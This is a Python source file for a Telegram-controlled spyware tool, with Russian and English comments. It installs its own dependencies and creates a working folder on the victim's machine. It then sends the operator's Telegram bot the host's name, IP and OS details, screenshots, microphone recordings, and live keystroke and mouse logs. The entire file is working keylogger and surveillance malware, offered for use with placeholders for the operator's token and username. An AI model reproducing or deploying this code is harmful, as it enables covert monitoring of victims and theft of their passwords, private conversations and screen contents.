try:
        import telebot
        from telebot import *
        import logging
        import os
        import platform
        import socket
        import wave
        import mss
        import mss.tools
        import sounddevice as sd
        from pynput import keyboard
        from pynput.keyboard import Listener
        from pynput import mouse
        from scipy.io.wavfile import write
except ModuleNotFoundError:
    from subprocess import call
    modules = ["mss", "sounddevice", "pynput", "scipy", "pyTelegramBotAPI"]
    call("pip install " + ' '.join(modules), shell=True)

    
bot = telebot.TeleBot("ТВОЙ ТОКЕН БОТА\YOUR BOT TOKEN")
audioname = "C:/bot/audio.wav"
pngname = "C:/bot/screen.png"


if not os.path.exists('C:/bot'):
        os.mkdir('C:/bot')
        bot.send_message("твой @username телеграма\your @username for telegram", 'начало работы)')
else:
    bot.send_message("твой @username телеграма\your @username for telegram", 'начало работы')


def system_information():
    hostname = socket.gethostname()
    ip = socket.gethostbyname(hostname)
    plat = platform.processor()
    system = platform.system()
    machine = platform.machine()
    return hostname, ip, plat, system, machine
def screenshot():
    screen = mss.mss().grab(mss.mss().monitors[1])
    mss.tools.to_png(screen.rgb, screen.size, output = pngname) 
def microphone():
    fs = 44100
    seconds = 3
    obj = wave.open('C:/bot/sound.wav', 'w')
    obj.setnchannels(1)
    obj.setsampwidth(2)
    obj.setframerate(fs)
    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=1)
    sd.wait()
    write(audioname, fs, myrecording)



def on_click(x, y, button, pressed):
    if pressed:
        bot.send_message("твой @username телеграма\your @username for telegram", f"Нажата {button} в ({x}, {y})")
    else:
        bot.send_message("твой @username телеграма\your @username for telegram", f"Отпущена {button}")
        
def on_scroll(x, y, dx, dy):
    bot.send_message("твой @username телеграма\your @username for telegram", f"Прокрутка {'вверх' if dy > 0 else 'вниз'} в ({x}, {y})")

def on_press(key):
    try:
        bot.send_message("твой @username телеграма\your @username for telegram", f'Альфа-клавиша {key.char} нажата')
    except AttributeError:
        bot.send_message("твой @username телеграма\your @username for telegram", f'Спец-клавиша {key} нажата')

def on_release(key):
    bot.send_message("твой @username телеграма\your @username for telegram", f'{key} отпущена')

def run_keyboard():
        keyboard_listener = keyboard.Listener(on_press=on_press, on_release=on_release)
        keyboard_listener.start()
        @bot.message_handler(commands=['skey'])
        def comman(message):
                command = message.text.split()[0][1:]
                if command == 'skey':
                        keyboard_listener.stop()
def run_mouse():
        mouse_listener = mouse.Listener(on_click=on_click, on_scroll=on_scroll)
        mouse_listener.start()
        @bot.message_handler(commands=['smouse'])
        def comman(message):
                command = message.text.split()[0][1:]
                if command == 'smouse':
                        mouse_listener.stop()




@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'проверка')

@bot.message_handler(commands=['system', 'picture', 'sound', 'key', 'mouse'])
def comman(message):
    command = message.text.split()[0][1:]
    if command == 'system':
        hostname, ip, plat, system, machine = system_information()
        bot.send_message(message.chat.id, f"имя: {hostname} \nip: {ip} \nOC: {system} \nplat: {plat} \nmachine: {machine}")
    elif command == 'picture':
        screenshot()
        with open(pngname, 'rb') as image:
            bot.send_photo(message.chat.id, image)
        os.remove(pngname)
    elif command == 'sound':
        microphone()
        with open(audioname, 'rb') as audio:
            bot.send_audio(message.chat.id, audio)
        os.remove(audioname)
        os.remove('C:/bot/sound.wav')
    elif command == 'key':
            run_keyboard()
    elif command == 'mouse':
            run_mouse()
            
bot.infinity_polling()
